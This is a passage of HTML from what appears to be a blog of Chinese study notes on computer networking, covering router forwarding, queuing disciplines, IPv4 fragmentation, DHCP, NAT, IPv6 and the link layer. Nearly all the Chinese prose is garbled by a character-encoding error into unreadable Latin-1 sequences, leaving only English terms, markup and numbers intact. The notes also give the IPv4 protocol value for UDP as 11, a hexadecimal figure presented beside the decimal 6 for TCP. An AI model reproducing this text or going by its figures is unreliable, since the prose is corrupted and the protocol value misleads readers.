(routing algorithm)</li></ul><p>æ¯å°ç½‘ç»œè·¯ç”±å™¨ä¸­æœ‰ä¸€ä¸ªå…³é”®å…ƒç´ æ˜¯å®ƒçš„ <mark>è½¬å‘è¡¨ (forwarding table)</mark>:<br><img src="/../img/forwarding_table_choose_path.png"></p><h4 id="1-æ§åˆ¶å¹³é¢ï¼šä¼ ç»Ÿçš„æ–¹æ³•"><a href="#1-æ§åˆ¶å¹³é¢ï¼šä¼ ç»Ÿçš„æ–¹æ³•" class="headerlink" title="1. æ§åˆ¶å¹³é¢ï¼šä¼ ç»Ÿçš„æ–¹æ³•"></a>1. æ§åˆ¶å¹³é¢ï¼šä¼ ç»Ÿçš„æ–¹æ³•</h4><p>è·¯ç”±é€‰æ‹©ç®—æ³•å†³å®šäº†æ’å…¥è¯¥è·¯ç”±è½¬å‘è¡¨çš„å†…å®¹.</p><h4 id="2-æ§åˆ¶å¹³é¢ï¼šSDN-æ–¹æ³•"><a href="#2-æ§åˆ¶å¹³é¢ï¼šSDN-æ–¹æ³•" class="headerlink" title="2. æ§åˆ¶å¹³é¢ï¼šSDN æ–¹æ³•"></a>2. æ§åˆ¶å¹³é¢ï¼šSDN æ–¹æ³•</h4><p>ä½¿ç”¨è¯¥æ–¹æ³•ï¼Œæ¯å°è·¯ç”±å™¨éƒ½æœ‰ä¸€ä¸ªä¸å…¶ä»–è·¯ç”±å™¨çš„è·¯ç”±é€‰æ‹©ç»„ä»¶é€šä¿¡çš„è·¯ç”±é€‰æ‹©ç»„ä»¶ã€‚</p><p>SDN æ˜¯ Software-Defined Networking, è½¯ä»¶å®šä¹‰ç½‘ç»œ. å› ä¸ºè®¡ç®—è½¬å‘è¡¨å¹¶ä¸è·¯ç”±å™¨äº¤äº’çš„æ§åˆ¶å™¨æ˜¯ç”¨è½¯ä»¶å®ç°çš„.</p><h3 id="4-1-2-ç½‘ç»œæœåŠ¡æ¨¡å‹-network-service-model"><a href="#4-1-2-ç½‘ç»œæœåŠ¡æ¨¡å‹-network-service-model" class="headerlink" title="4.1.2 ç½‘ç»œæœåŠ¡æ¨¡å‹ network service model"></a>4.1.2 ç½‘ç»œæœåŠ¡æ¨¡å‹ network service model</h3><h2 id="4-2-è·¯ç”±å™¨å·¥ä½œåŸç†"><a href="#4-2-è·¯ç”±å™¨å·¥ä½œåŸç†" class="headerlink" title="4.2 è·¯ç”±å™¨å·¥ä½œåŸç†"></a>4.2 è·¯ç”±å™¨å·¥ä½œåŸç†</h2><p><mark>è½¬å‘åŠŸèƒ½</mark>, å°†åˆ†ç»„ä»ä¸€å°è·¯ç”±å™¨çš„å…¥é“¾è·¯ä¼ é€åˆ°é€‚å½“çš„å‡ºé“¾è·¯.</p><p>å››ä¸ªç»„ä»¶:<br><img src="/../img/four_components_of_routor.png"></p><p>è·¯ç”±å™¨çš„è¾“å…¥ç«¯å£ï¼Œè¾“å‡ºç«¯å£å’Œäº¤æ¢ç»“æ„å‡ ä¹æ€»æ˜¯ç”¨ç¡¬ä»¶å®ç°.</p><h3 id="4-2-1-è¾“å…¥ç«¯å£å¤„ç†å’ŒåŸºäºç›®çš„åœ°è½¬å‘"><a href="#4-2-1-è¾“å…¥ç«¯å£å¤„ç†å’ŒåŸºäºç›®çš„åœ°è½¬å‘" class="headerlink" title="4.2.1 è¾“å…¥ç«¯å£å¤„ç†å’ŒåŸºäºç›®çš„åœ°è½¬å‘"></a>4.2.1 è¾“å…¥ç«¯å£å¤„ç†å’ŒåŸºäºç›®çš„åœ°è½¬å‘</h3><p>æœç´¢è½¬å‘è¡¨æŸ¥æ‰¾æœ€å¸¸å‰ç¼€åŒ¹é….</p><p>ä¸€æ—¦é€šè¿‡æŸ¥æ‰¾ç¡®å®šäº†æŸåˆ†ç»„çš„è¾“å‡ºç«¯å£ï¼Œåˆ™è¯¥åˆ†ç»„å°±èƒ½å¤Ÿå‘é€è¿›å…¥äº¤æ¢ç»“æ„.</p><p>åœ¨æŸäº›è®¾è®¡ä¸­,å¦‚æœæ¥è‡ªå…¶ä»–è¾“å…¥ç«¯å£çš„åˆ†ç»„å½“å‰æ­£åœ¨ä½¿ç”¨è¯¥äº¤æ¢ç»“æ„,ä¸€ä¸ªåˆ†ç»„å¯èƒ½ä¼šåœ¨è¿›å…¥äº¤æ¢ç»“æ„æ—¶è¢«æš‚æ—¶é˜»å¡ã€‚å› æ­¤,ä¸€ä¸ªè¢«é˜»å¡çš„åˆ†ç»„å¿…é¡»è¦åœ¨è¾“å…¥ç«¯å£å¤„æ’é˜Ÿ,å¹¶ç­‰å¾…ç¨åè¢«åŠæ—¶è°ƒåº¦ä»¥é€šè¿‡äº¤æ¢ç»“æ„</p><h3 id="4-2-2-äº¤æ¢"><a href="#4-2-2-äº¤æ¢" class="headerlink" title="4.2.2 äº¤æ¢"></a>4.2.2 äº¤æ¢</h3><p>äº¤æ¢ç»“æ„ä½¿å¾—åˆ†ç»„èƒ½å¤Ÿå®é™…åœ°ä»ä¸€ä¸ªè¾“å…¥ç«¯äº¤æ¢ (å³è½¬å‘) åˆ°ä¸€ä¸ªè¾“å‡ºç«¯å£ä¸­.</p><p>ä¸‰ç§äº¤æ¢æŠ€æœ¯:</p><ul><li>ç»å†…å­˜äº¤æ¢</li><li>ç»æ€»çº¿äº¤æ¢</li><li>ç»äº’è”ç½‘ç»œäº¤æ¢</li></ul><p><img src="/../img/three_switch_tech.png"></p><h3 id="4-2-3-è¾“å‡ºç«¯å£å¤„ç†"><a href="#4-2-3-è¾“å‡ºç«¯å£å¤„ç†" class="headerlink" title="4.2.3 è¾“å‡ºç«¯å£å¤„ç†"></a>4.2.3 è¾“å‡ºç«¯å£å¤„ç†</h3><p><img src="/../img/handle_the_output_port.png"></p><h3 id="4-2-4-ä½•æ—¶å‡ºç°æ’é˜Ÿ"><a href="#4-2-4-ä½•æ—¶å‡ºç°æ’é˜Ÿ" class="headerlink" title="4.2.4 ä½•æ—¶å‡ºç°æ’é˜Ÿ"></a>4.2.4 ä½•æ—¶å‡ºç°æ’é˜Ÿ</h3><p>éšç€é˜Ÿåˆ—çš„å¢é•¿, è·¯ç”±å™¨çš„ç¼“å­˜ç©ºé—´æœ€ç»ˆå°†ä¼šè€—å°½ï¼Œå¹¶ä¸”å½“æ— å†…å­˜å¯ç”¨äºå­˜å‚¨åˆ°è¾¾çš„åˆ†ç»„æ—¶å°†ä¼šå‡ºç°ä¸¢åŒ… (packet loss).</p><h3 id="4-2-5-åˆ†ç»„è°ƒåº¦"><a href="#4-2-5-åˆ†ç»„è°ƒåº¦" class="headerlink" title="4.2.5 åˆ†ç»„è°ƒåº¦"></a>4.2.5 åˆ†ç»„è°ƒåº¦</h3><h4 id="1-å…ˆè¿›çŒ®å‡º-First-In-First-Out-FIFO"><a href="#1-å…ˆè¿›çŒ®å‡º-First-In-First-Out-FIFO" class="headerlink" title="1. å…ˆè¿›çŒ®å‡º First-In-First-Out (FIFO)"></a>1. å…ˆè¿›çŒ®å‡º First-In-First-Out (FIFO)</h4><h4 id="2-ä¼˜å…ˆæƒæ’é˜Ÿ-priority-queuing"><a href="#2-ä¼˜å…ˆæƒæ’é˜Ÿ-priority-queuing" class="headerlink" title="2. ä¼˜å…ˆæƒæ’é˜Ÿ priority queuing"></a>2. ä¼˜å…ˆæƒæ’é˜Ÿ priority queuing</h4><p>æ¯ä¸ªä¼˜å…ˆæƒç±»é€šå¸¸éƒ½æœ‰è‡ªå·±çš„é˜Ÿåˆ—.</p><p><img src="/../img/priority_queuing_modle.png"></p><h4 id="3-å¾ªç¯å’ŒåŠ æƒå…¬å¹³æ’é˜Ÿ-round-robin-queuing-discipline"><a href="#3-å¾ªç¯å’ŒåŠ æƒå…¬å¹³æ’é˜Ÿ-round-robin-queuing-discipline" class="headerlink" title="3. å¾ªç¯å’ŒåŠ æƒå…¬å¹³æ’é˜Ÿ (round robin queuing discipline)"></a>3. å¾ªç¯å’ŒåŠ æƒå…¬å¹³æ’é˜Ÿ (round robin queuing discipline)</h4><blockquote><p>å¾ªç¯</p></blockquote><p>åˆ†ç»„åƒä½¿ç”¨ä¼˜å…ˆæƒæ’é˜Ÿé‚£æ ·è¢«åˆ†ç±»ï¼Œç„¶è€Œï¼Œåœ¨ç±»ä¹‹é—´ä¸å­˜åœ¨ä¸¥æ ¼çš„æœåŠ¡ä¼˜å…ˆæƒï¼Œå¾ªç¯è°ƒåº¦å™¨åœ¨è¿™äº›<mark>ç±»ä¹‹é—´è½®æµæä¾›æœåŠ¡</mark>.</p><blockquote><p>åŠ æƒ</p></blockquote><p>æ˜¯ä¸€ç§é€šç”¨å½¢å¼çš„å¾ªç¯æ’é˜Ÿ. å¤§ä½“å’Œå¾ªç¯æ’é˜Ÿç›¸åŒ. ä¸åŒä¹‹å¤„åœ¨äºæ¯ä¸ªç±»åœ¨ä»»ä½•æ—¶é—´é—´éš”å†…å¯èƒ½æ”¶åˆ°ä¸åŒæ•°é‡çš„æœåŠ¡.</p><h2 id="4-3-ç½‘é™…åè®®-IPv4-å¯»å€-IPv6-åŠå…¶ä»–"><a href="#4-3-ç½‘é™…åè®®-IPv4-å¯»å€-IPv6-åŠå…¶ä»–" class="headerlink" title="4.3 ç½‘é™…åè®®: IPv4, å¯»å€, IPv6 åŠå…¶ä»–"></a>4.3 ç½‘é™…åè®®: IPv4, å¯»å€, IPv6 åŠå…¶ä»–</h2><h3 id="4-3-1-IPv4-æ•°æ®æŠ¥æ ¼å¼"><a href="#4-3-1-IPv4-æ•°æ®æŠ¥æ ¼å¼" class="headerlink" title="4.3.1 IPv4 æ•°æ®æŠ¥æ ¼å¼"></a>4.3.1 IPv4 æ•°æ®æŠ¥æ ¼å¼</h3><p><img src="/../img/datagram_format_of_IPv4.png"></p><p>åè®®å­—æ®µï¼Œè¡¨ç¤º IP æ•°æ®æŠ¥çš„æ•°æ®éƒ¨åˆ†åº”äº¤ç»™å“ªä¸ªç‰¹å®šçš„è¿è¾“å±‚åè®®: å€¼ä¸º 6 è¡¨æ˜æ•°æ®éƒ¨åˆ†è¦äº¤ç»™ TCP, å€¼ä¸º 11 è¡¨æ˜æ•°æ®è¦äº¤ç»™ UDP.</p><p>ä¸€ä¸ª IP æ•°æ®æŠ¥æœ‰æ€»é•¿ä¸º 20 å­—èŠ‚çš„é¦–éƒ¨ (å‡è®¾æ— é€‰é¡¹).</p><h3 id="4-3-2-IPv4-æ•°æ®æŠ¥åˆ†ç‰‡"><a href="#4-3-2-IPv4-æ•°æ®æŠ¥åˆ†ç‰‡" class="headerlink" title="4.3.2 IPv4 æ•°æ®æŠ¥åˆ†ç‰‡"></a>4.3.2 IPv4 æ•°æ®æŠ¥åˆ†ç‰‡</h3><p>å¹¶ä¸æ˜¯æ‰€æœ‰é“¾è·¯å±‚åè®®éƒ½èƒ½æ‰¿è½½ç›¸åŒé•¿åº¦çš„ç½‘ç»œå±‚åˆ†ç»„. æœ‰çš„åè®®èƒ½æ‰¿è½½å¤§æ•°æ®æŠ¥, è€Œæœ‰çš„åè®®åªèƒ½æ‰¿è½½å°åˆ†ç»„.</p><p>ä¸€ä¸ªé“¾è·¯å±‚å¸§èƒ½æ‰¿è½½çš„æœ€å¤§æ•°æ®é‡å«åš <mark>æœ€å¤§ä¼ é€å•å…ƒ</mark> (Maximum Transmission Unit, MTU).</p><p>å°†è¿‡å¤§çš„ IP åˆ†ç»„æŒ¤è¿›é“¾è·¯å±‚å¸§çš„æ–¹æ³•æ˜¯å°† IP æ•°æ®æŠ¥åˆ†ç‰‡.</p><p>ç”¨å•ç‹¬çš„é“¾è·¯å±‚å¸§å°è£…è¿™äº›è¾ƒå°çš„ IP æ•°æ®æŠ¥, ç„¶åé€šè¿‡è¾“å‡ºé“¾è·¯å‘é€è¿™äº›å¸§, æ¯ä¸ªè¿™äº›è¾ƒå°çš„æ•°æ®æŠ¥éƒ½ç§°ä¸º <mark>ç‰‡ (fragment)</mark> </p><p>ç‰‡åœ¨å…¶åˆ°è¾¾ç›®çš„åœ°è¿è¾“å±‚ä»¥å‰éœ€è¦é‡æ–°ç»„è£….</p><p>ä¸ºåšæŒç½‘ç»œå†…æ ¸ä¿æŒç®€å•çš„åŸåˆ™, IPv4 çš„è®¾è®¡è€…å†³å®šå°†æ•°æ®æŠ¥çš„é‡æ–°ç»„è£…å·¥ä½œæ”¾åˆ°ç«¯ç³»ç»Ÿä¸­, è€Œä¸æ˜¯æ”¾åˆ°ç½‘ç»œè·¯ç”±å™¨ä¸­. <mark>ä¹Ÿå°±æ˜¯, åˆ†ç‰‡åœ¨è·¯ç”±å™¨, ç»„è£…åœ¨æ¥å—è€…ä¸»æœº</mark> </p><p>ä¸ºäº†è®©ç›®çš„ä¸»æœºæ‰§è¡Œè¿™äº›é‡æ–°ç»„è£…ä»»åŠ¡, IPv4 çš„è®¾è®¡è€…è®²æ ‡è¯†, æ ‡è¯†å’Œç‰‡åç§»å­—æ®µæ”¾åœ¨ <mark>IP æ•°æ®æŠ¥é¦–éƒ¨</mark>ä¸­.</p><p>å½“ç”Ÿæˆä¸€ä¸ªæ•°æ®æŠ¥æ—¶, å‘é€ä¸»æœºåœ¨ä¸ºè¯¥æ•°æ®æŠ¥è®¾ç½®æºå’Œç›®çš„åœ°å€çš„åŒæ—¶è´´ä¸Šæ ‡è¯†å·, å‘é€ä¸»æœºé€šå¸¸å°†å®ƒå‘é€çš„æ¯ä¸ªæ•°æ®æŠ¥çš„æ ‡è¯†å·åŠ  1. </p><p>å½“ç›®çš„åœ°ä»åŒä¸€å‘é€ä¸»æœºæ”¶åˆ°ä¸€ç³»åˆ—æ•°æ®æŠ¥æ—¶, å®ƒèƒ½å¤Ÿæ£€æŸ¥æ•°æ®æŠ¥çš„æ ‡è¯†å·ä»¥ç¡®å®šå“ªäº›æ•°æ®æŠ¥å®é™…ä¸Šæ˜¯åŒä¸€è¾ƒå¤§æ•°æ®æŠ¥çš„ç‰‡.</p><p>ä¸ºäº†è®©ç›®çš„ä¸»æœºç»å¯¹åœ°ç›¸ä¿¡å®ƒå·²æ”¶åˆ°äº†åˆå§‹æ•°æ®æŠ¥çš„æœ€åä¸€ä¸ªç‰‡, <mark>æœ€åä¸€ä¸ªç‰‡çš„æ ‡è¯†æ¯”ç‰¹è¢«è®¾ç½®ä¸º 0, è€Œå…¶ä»–æ‰€æœ‰å…¶ä»–ç‰‡çš„æ ‡è¯†æ¯”ç‰¹è¢«è®¾ä¸º 1</mark> </p><p><mark>ä¸ºäº†è®©ç›®çš„ä¸»æœºç¡®å®šæ˜¯å¦ä¸¢å¤±äº†ä¸€ä¸ªç‰‡ (ä¸”èƒ½æŒ‰æ­£ç¡®çš„é¡ºåºé‡æ–°ç»„è£…ç‰‡)</mark>, ä½¿ç”¨åç§»å­—æ®µæŒ‡å®šè¯¥ç‰‡åº”æ”¾åœ¨åˆå§‹ IP æ•°æ®æŠ¥çš„å“ªä¸ªä½ç½®.</p><h3 id="4-3-3-IPv4-ç¼–å€"><a href="#4-3-3-IPv4-ç¼–å€" class="headerlink" title="4.3.3 IPv4 ç¼–å€"></a>4.3.3 IPv4 ç¼–å€</h3><p><mark>ä¸»æœºä¸è·¯ç”±å™¨è¿å…¥ç½‘ç»œçš„æ–¹æ³•</mark> : ä¸€å°ä¸»æœºé€šå¸¸åªæœ‰ä¸€æ¡é“¾è·¯è¿æ¥åˆ°ç½‘ç»œ. å½“ä¸»æœºä¸­çš„ IP æƒ³å‘é€ä¸€ä¸ªæ•°æ®æŠ¥æ—¶, å®ƒå°±åœ¨è¯¥é“¾è·¯ä¸Šå‘é€. </p><p>ä¸»æœºä¸ç‰©ç†é“¾è·¯ä¹‹é—´çš„è¾¹ç•Œå«åš <mark>æ¥å£ (interface)</mark> </p><h4 id="1-è·å–ä¸€å—åœ°å€"><a href="#1-è·å–ä¸€å—åœ°å€" class="headerlink" title="1. è·å–ä¸€å—åœ°å€"></a>1. è·å–ä¸€å—åœ°å€</h4><p><mark>ICANN ç»„ç»‡</mark>çš„ä½œç”¨ä¸ä»…æ˜¯åˆ†é… IP åœ°å€, è¿˜ç®¡ç† DNS æ ¹æœåŠ¡å™¨. å…¶è¿˜ä¼šåˆ†é…åŸŸåä¸è§£å†³åŸŸåçº·äº‰.</p><p>ICANN å‘åŒºåŸŸæ€§å› ç‰¹ç½‘æ³¨å†Œæœºæ„åˆ†é…åœ°å€, è¿™äº›æœºæ„ä¸€èµ·å½¢æˆäº† ICANN çš„åœ°å€æ”¯æŒç»„ç»‡, å¤„ç†æœ¬åŒºåŸŸå†…çš„åœ°å€åˆ†é…&#x2F;ç®¡ç†.</p><h4 id="2-è·å–ä¸»æœºåœ°å€-åŠ¨æ€ä¸»æœºé…ç½®åè®®-Dynamic-Host-Configuration-DHCP"><a href="#2-è·å–ä¸»æœºåœ°å€-åŠ¨æ€ä¸»æœºé…ç½®åè®®-Dynamic-Host-Configuration-DHCP" class="headerlink" title="2. è·å–ä¸»æœºåœ°å€: åŠ¨æ€ä¸»æœºé…ç½®åè®® (Dynamic Host Configuration, DHCP)"></a>2. è·å–ä¸»æœºåœ°å€: åŠ¨æ€ä¸»æœºé…ç½®åè®® (Dynamic Host Configuration, DHCP)</h4><p>DHCP å…è®¸ä¸»æœºè‡ªåŠ¨è·å– (è¢«åˆ†é…) ä¸€ä¸ª IP åœ°å€.</p><p>ç½‘ç»œç®¡ç†å‘˜èƒ½å¤Ÿé…ç½® DHCP, ä»¥ä½¿æŸç»™å®šä¸»æœºæ¯æ¬¡ä¸ç½‘ç»œè¿æ¥æ—¶èƒ½å¾—åˆ°ä¸€ä¸ªç›¸åŒçš„ IP åœ°å€, æˆ–è€…æŸä¸»æœºå°†è¢«åˆ†é…ä¸€ä¸ªä¸´æ—¶çš„ IP åœ°å€, æ¯æ¬¡ä¸ç½‘ç»œè¿æ¥æ—¶è¯¥åœ°å€ä¹Ÿè®¸æ˜¯ä¸åŒçš„.</p><p>æœ€ç®€å•åœºåˆä¸‹, æ¯ä¸ªå­ç½‘å°†å…·æœ‰ä¸€ä¸ª DHCP æœåŠ¡å™¨, å¦‚æœåœ¨æŸå­ç½‘ä¸­æ²¡æœ‰æœåŠ¡å™¨, åˆ™éœ€è¦ä¸€ä¸ª DHCP ä¸­ç»§ä»£ç† (é€šå¸¸æ˜¯ä¸€å°è·¯ç”±å™¨), è¿™ä¸ªä»£ç†çŸ¥é“ç”¨äºè¯¥ç½‘ç»œçš„ DHCP æœåŠ¡å™¨çš„åœ°å€.</p><h3 id="4-3-4-ç½‘ç»œåœ°å€è½¬æ¢-Network-Address-Translation-NAT"><a href="#4-3-4-ç½‘ç»œåœ°å€è½¬æ¢-Network-Address-Translation-NAT" class="headerlink" title="4.3.4 ç½‘ç»œåœ°å€è½¬æ¢ (Network Address Translation, NAT)"></a>4.3.4 ç½‘ç»œåœ°å€è½¬æ¢ (Network Address Translation, NAT)</h3><p><mark>å…·æœ‰ä¸“ç”¨åœ°å€çš„åœ°åŸŸ (realm with private address)</mark> æŒ‡å…¶åœ°å€ä»…å¯¹è¯¥ç½‘ç»œä¸­çš„è®¾å¤‡æœ‰æ„ä¹‰çš„ç½‘ç»œ.</p><p><mark>NAT è·¯ç”±å™¨</mark>å¯¹å¤–ç•Œçš„è¡Œä¸ºå°±å¦‚åŒä¸€ä¸ªå…·æœ‰å•ä¸€ IP åœ°å€çš„å•ä¸€è®¾å¤‡.</p><p>ä»æœ¬è´¨ä¸Šè®², NAT ä½¿èƒ½è·¯ç”±å™¨å¯¹å¤–ç•Œéšè—äº†å®¶åº­ç½‘ç»œçš„ç»†èŠ‚.</p><p>è·¯ç”±å™¨ä» ISP çš„ DHCP æœåŠ¡å™¨å¾—åˆ°å®ƒçš„åœ°å€, å¹¶ä¸”è·¯ç”±å™¨è¿è¡Œä¸€ä¸ª DHCP æœåŠ¡å™¨, ä¸ºä½äº NAT-DHCP è·¯ç”±å™¨æ§åˆ¶çš„å®¶åº­ç½‘ç»œç©ºé—´ä¸­çš„è®¡ç®—æœºæä¾›åœ°å€.</p><p><img src="/../img/NAT.png"></p><p><mark>NAT è½¬æ¢è¡¨ (NAT translation table)</mark> ä¸­åŒ…å«ç«¯å£å·å’Œ IP åœ°å€. ä¸åŒçš„å†…éƒ¨ä¸»æœºåŠå…¶ç«¯å£å·æ˜ å°„åˆ°å¯¹å¤– IP çš„ä¸åŒç«¯å£ä¸Š.</p><p>ç«¯å£å·å­—æ®µä¸º 16 æ¯”ç‰¹é•¿, NAT åè®®å¯æ”¯æŒè¶…è¿‡ 60000 ä¸ªå¹¶è¡Œä½¿ç”¨è·¯ç”±å™¨å¹¿åŸŸç½‘ä¸€ä¾§å•ä¸ª IP åœ°å€çš„è¿æ¥.</p><p>åŸæœ¬ç«¯å£å·æ˜¯ç”¨äºè¿›ç¨‹å¯»å€è€Œä¸æ˜¯ä¸»æœºå¯»å€, å› æ­¤ä¼šå‡ºç°ä¸€äº›é—®é¢˜.</p><h3 id="4-3-5-IPv6"><a href="#4-3-5-IPv6" class="headerlink" title="4.3.5 IPv6"></a>4.3.5 IPv6</h3><h4 id="IPv6-æ•°æ®æŠ¥æ ¼å¼"><a href="#IPv6-æ•°æ®æŠ¥æ ¼å¼" class="headerlink" title="IPv6 æ•°æ®æŠ¥æ ¼å¼"></a>IPv6 æ•°æ®æŠ¥æ ¼å¼</h4><p><img src="/../img/format_of_IPv6_package.png"></p><p>IP åœ°å€é•¿åº¦ä» 32 æ¯”ç‰¹å¢åŠ åˆ° 128 æ¯”ç‰¹.</p><p>å¼•å…¥äº† <mark>ä»»æ’­åœ°å€ (anycast address)</mark>, ä½¿æ•°æ®äº¤ä»˜ç»™ä¸€ç»„ä¸»æœºä¸­çš„ä»»æ„ä¸€ä¸ª.</p><p>40 å­—èŠ‚é¦–éƒ¨.</p><p><mark>IPv6 ä¸å…è®¸åœ¨ä¸­é—´è·¯ç”±å™¨ä¸Šè¿›è¡Œåˆ†ç‰‡ä¸é‡æ–°ç»„è£…</mark>, è¿™ç§æ“ä½œåªèƒ½åœ¨æºä¸ç›®çš„åœ°æ‰§è¡Œ.</p><h4 id="ä»-IPv4-åˆ°-IPv6-çš„è¿ç§»"><a href="#ä»-IPv4-åˆ°-IPv6-çš„è¿ç§»" class="headerlink" title="ä» IPv4 åˆ° IPv6 çš„è¿ç§»"></a>ä» IPv4 åˆ° IPv6 çš„è¿ç§»</h4><p><mark>å»ºéš§é“</mark>å¤„ç†, å°†ä¸¤ä¸ª IPv6 èŠ‚ç‚¹ä¹‹é—´çš„æ‰€æœ‰ IPv4 èŠ‚ç‚¹è§†ä¸ºä¸€ä¸ªéš§é“. å°†æ•´ä¸ª IPv6 æ•°æ®æŠ¥æ”¾åˆ°ä¸€ä¸ª IPv4 æ•°æ®æŠ¥çš„æ•°æ®å­—æ®µä¸­.</p><p><img src="/../img/build_turnal.png"></p><h2 id="4-4-é€šç”¨è½¬å‘å’Œ-SDN"><a href="#4-4-é€šç”¨è½¬å‘å’Œ-SDN" class="headerlink" title="4.4 é€šç”¨è½¬å‘å’Œ SDN"></a>4.4 é€šç”¨è½¬å‘å’Œ SDN</h2><p>å› ç‰¹ç½‘è·¯ç”±å™¨çš„è½¬å‘å†³å®š<mark>ä¼ ç»Ÿä¸Š</mark>ä»…ä»…åŸºäºåˆ†ç»„çš„ç›®çš„åœ°å€.</p><p><mark>é€šç”¨è½¬å‘</mark>ï¼Œå…¶ä¸­è½¬å‘å’Œå…¶ä»–åŠŸèƒ½å¯ä»¥ä½¿ç”¨æ•°æ®æŠ¥é¦–éƒ¨ä¸­çš„å‡ ä¸ªä¸åŒçš„å­—æ®µå€¼.</p><h1 id="ç¬¬5ç« -ç½‘ç»œå±‚-æ§åˆ¶å¹³é¢"><a href="#ç¬¬5ç« -ç½‘ç»œå±‚-æ§åˆ¶å¹³é¢" class="headerlink" title="ç¬¬5ç«  ç½‘ç»œå±‚: æ§åˆ¶å¹³é¢"></a>ç¬¬5ç«  ç½‘ç»œå±‚: æ§åˆ¶å¹³é¢</h1><p>æ§åˆ¶å¹³é¢æ§åˆ¶æ²¿ç€ä»åŸä¸»æœºåˆ°ç›®çš„ä¸»æœºçš„ç«¯åˆ°è·¯å¾„é—´çš„è·¯ç”±å™¨ <mark>å¦‚ä½•å‘é€æ•°æ®</mark> ä¸”æ§åˆ¶<mark>ç½‘ç»œå±‚ç»„ä»¶å’ŒæœåŠ¡å¦‚ä½•é…ç½®å’Œç®¡ç†</mark>.</p><h2 id="5-1-æ¦‚è¿°"><a href="#5-1-æ¦‚è¿°" class="headerlink" title="5.1 æ¦‚è¿°"></a>5.1 æ¦‚è¿°</h2><h2 id="5-2-è·¯ç”±é€‰æ‹©ç®—æ³•-routing-algorithm"><a href="#5-2-è·¯ç”±é€‰æ‹©ç®—æ³•-routing-algorithm" class="headerlink" title="5.2 è·¯ç”±é€‰æ‹©ç®—æ³• (routing algorithm)"></a>5.2 è·¯ç”±é€‰æ‹©ç®—æ³• (routing algorithm)</h2><p>ç›®çš„: ä»å‘é€æ–¹åˆ°æ¥æ”¶æ–¹çš„è¿‡ç¨‹ä¸­ç¡®å®šä¸€æ¡é€šè¿‡è·¯ç”±å™¨ç½‘ç»œçš„å¥½çš„è·¯å¾„. (å³æœ€ä½å¼€é”€çš„è·¯å¾„)</p><h1 id="ç¬¬6ç« -é“¾è·¯å±‚å’Œå±€åŸŸç½‘"><a href="#ç¬¬6ç« -é“¾è·¯å±‚å’Œå±€åŸŸç½‘" class="headerlink" title="ç¬¬6ç«  é“¾è·¯å±‚å’Œå±€åŸŸç½‘"></a>ç¬¬6ç«  é“¾è·¯å±‚å’Œå±€åŸŸç½‘</h1><p>ä¸¤ç§ä¸åŒç±»å‹çš„é“¾è·¯å±‚ä¿¡é“:</p><ul><li>å¹¿æ’­ä¿¡é“, ç”¨äºè¿æ¥æœ‰é™å±€åŸŸç½‘, å«æ˜Ÿç½‘å’Œæ··åˆå…‰çº¤åŒè½´ç”µç¼†æ¥å…¥ç½‘ä¸­çš„å¤šå°ä¸»æœº</li><li>ç‚¹å¯¹ç‚¹é€šä¿¡é“¾è·¯, é•¿è·ç¦»é“¾è·¯è¿æ¥çš„è·¯ç”±å™¨ä¹‹é—´</li></ul><h2 id="6-1-é“¾è·¯å±‚æ¦‚è¿°"><a href="#6-1-é“¾è·¯å±‚æ¦‚è¿°" class="headerlink" title="6.1 é“¾è·¯å±‚æ¦‚è¿°"></a>6.1 é“¾è·¯å±‚æ¦‚è¿°</h2><p>å°†è¿è¡Œé“¾è·¯å±‚åè®®çš„ä»»ä½•è®¾å¤‡å‡ç§°ä¸º <mark>èŠ‚ç‚¹ (node)</mark> . åŒ…æ‹¬ä¸»æœº, è·¯ç”±å™¨, äº¤æ¢æœºå’Œ WiFi æ¥å…¥ç‚¹.</p><p>æŠŠæ²¿ç€é€šä¿¡è·¯å¾„<mark>è¿æ¥ç›¸é‚»èŠ‚ç‚¹</mark>çš„é€šä¿¡ä¿¡é“ç§°ä¸º <mark>é“¾è·¯ (link)</mark> </p><h3 id="6-1-1-é“¾è·¯å±‚æä¾›çš„æœåŠ¡"><a href="#6-1-1-é“¾è·¯å±‚æä¾›çš„æœåŠ¡" class="headerlink" title="6.1.1 é“¾è·¯å±‚æä¾›çš„æœåŠ¡"></a>6.1.1 é“¾è·¯å±‚æä¾›çš„æœåŠ¡</h3><p>é“¾è·¯å±‚åè®®èƒ½å¤Ÿæä¾›çš„å¯èƒ½æœåŠ¡åŒ…æ‹¬:</p><ul><li>æˆå¸§ (framing), å³ç”¨é“¾è·¯å±‚å¸§å°è£…èµ·æ¥, å¸§çš„ç»“æ„ç”±é“¾è·¯å±‚åè®®è§„å®š</li><li>é“¾è·¯æ¥å…¥, åª’ä½“è®¿é—®æ§åˆ¶ (Medium Access Control, MAC) åè®®è§„å®šäº†å¸§åœ¨é“¾è·¯ä¸Šä¼ è¾“çš„è§„åˆ™</li><li>å¯é äº¤ä»˜, é€šè¿‡ç¡®è®¤å’Œé‡ä¼ </li><li>å·®é”™æ£€æµ‹å’Œçº æ­£, å¦‚å‘é€çš„æ¯”ç‰¹ä¸º 1, æ¥æ”¶ä¸º 0. åœ¨å¸§ä¸­åŒ…å«å·®é”™æ£€æµ‹æ¯”ç‰¹æ¥è®©æ¥æ”¶èŠ‚ç‚¹è¿›è¡Œå·®é”™æ£€æµ‹</li></ul><h3 id="6-1-2-é“¾è·¯å±‚åœ¨ä½•å¤„å®ç°"><a href="#6-1-2-é“¾è·¯å±‚åœ¨ä½•å¤„å®ç°" class="headerlink" title="6.1.2 é“¾è·¯å±‚åœ¨ä½•å¤„å®ç°"></a>6.1.2 é“¾è·¯å±‚åœ¨ä½•å¤„å®ç°</h3><p>é“¾è·¯å±‚çš„ä¸»ä½“éƒ¨åˆ†å®åœ¨ <mark>ç½‘ç»œé€‚é…å™¨ (network adapter)</mark> ä¸­å®ç°, å³ç½‘ç»œæ¥å£å¡ (Network Interface Card, NIC). å…¶ä½äº <mark>é“¾è·¯å±‚æ§åˆ¶å™¨</mark>, è¯¥æ§åˆ¶å™¨é€šå¸¸æ˜¯ä¸€ä¸ªå®ç°äº†è®¸å¤šé“¾è·¯å±‚æœåŠ¡ (æˆå¸§, é“¾è·¯æ¥å…¥, å·®é”™æ£€æµ‹ç­‰) çš„ä¸“ç”¨èŠ¯ç‰‡. è®¸å¤šåŠŸèƒ½ç”±ç¡¬ä»¶å®ç°.</p><p>ä»¥å‰ç½‘ç»œé€‚é…å™¨è¿˜æ˜¯ç‰©ç†ä¸Šåˆ†ç¦»çš„å¡. 